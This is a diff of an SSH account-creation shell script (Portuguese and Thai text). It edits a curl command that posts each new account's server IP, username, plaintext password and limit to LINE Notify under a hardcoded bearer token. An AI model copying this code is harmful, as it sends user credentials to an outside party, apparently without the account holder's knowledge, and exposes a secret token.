@@ -342,7 +342,10 @@ echo "$username $sshlimiter" >>/root/usuarios.db
 #แจ้งเตือนคนรันสคิป
 IP=$(wget -qO- ipv4.icanhazip.com);
 curl -X POST -H 'Authorization: Bearer AS5wVe8ahymLLtXC5UiBPFkLvBSZ475RkMEArpq8WHD' -F 'message='" 
-Test  $IP:77/openvpn/$username.zip U:$username P:$password L:$sshlimiter"'' https://notify-api.line.me/api/notify > /dev/null 2>&1
+Test  ลิ้ง$IP:88/openvpn/$username.zip 
+      ชื่อผู้ใช้:$username 
+      รหัส:$password 
+      จำกัด:$sshlimiter"'' https://notify-api.line.me/api/notify > /dev/null 2>&1
 		clear
 		echo -e "\E[44;1;37m       CONTA SSH CRIADA !      \E[0m"
 		echo -e "\n\033[1;32mIP: \033[1;37m$IP"
@@ -377,7 +380,7 @@ Test  $IP:77/openvpn/$username.zip U:$username P:$password L:$sshlimiter"'' http
 			[[ "$VERSION_ID" = 'VERSION_ID="14.04"' ]] && {
 				echo -e "\033[1;32mLINK\033[1;37m: \033[1;36m$IP:77/html/openvpn/$username.zip"
 			} || {
-				echo -e "\033[1;32mLINK\033[1;37m: \033[1;36m$IP:77/openvpn/$username.zip"
+				echo -e "\033[1;32mLINK\033[1;37m: \033[1;36m$IP:88/openvpn/$username.zip"
 			}
 		} || {
 			echo -e "\033[1;32mDisponivel em\033[1;31m" ~/"$username.zip\033[0m"
